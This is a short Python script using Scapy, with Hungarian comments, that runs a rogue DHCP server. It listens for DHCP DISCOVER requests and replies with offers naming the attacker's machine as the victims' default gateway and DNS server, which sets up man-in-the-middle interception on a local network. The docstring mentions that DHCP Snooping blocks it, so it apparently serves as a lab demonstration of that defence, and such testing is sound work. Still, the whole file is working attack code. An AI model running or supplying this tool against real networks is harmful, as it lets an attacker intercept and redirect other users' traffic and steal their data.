#!/usr/bin/env python3
"""Hamis DHCP-szerver: az OFFER-ben a támadót adja gateway-nek és DNS-nek.
DHCP Snooping után ezek az üzenetek eldobódnak az untrusted porton.

Futtatás: sudo python3 rogue_dhcp.py eth0
"""
import sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf

ROGUE_IP = "10.10.10.254"
POOL = [f"10.10.10.{i}" for i in range(100, 200)]
assigned = {}

def handle_discover(pkt):
    if pkt[UDP].dport == 67 and DHCP in pkt:
        opts = dict(x for x in pkt[DHCP].options if isinstance(x, tuple))
        if opts.get("message-type") != 1:        # csak DISCOVER
            return
        cli_mac = pkt[Ether].src
        offer_ip = assigned.setdefault(cli_mac, POOL[len(assigned) % len(POOL)])
        resp = (Ether(src=conf.iface.mac, dst=cli_mac) /
                IP(src=ROGUE_IP, dst=offer_ip) / UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                      chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
                              ("subnet_mask", "255.255.255.0"),
                              ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                              ("name_server", ROGUE_IP),
                              ("lease_time", 3600), "end"]))
        sendp(resp, verbose=0)
        print(f"[+] OFFER küldve {cli_mac} -> {offer_ip} gw={ROGUE_IP}")

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    print(f"[*] Rogue DHCP figyel a(z) {iface}-n. Ctrl+C a leállításhoz.")
    sniff(iface=iface, filter="udp and (port 67 or 68)", prn=handle_discover, store=0)

if __name__ == "__main__":
    main()
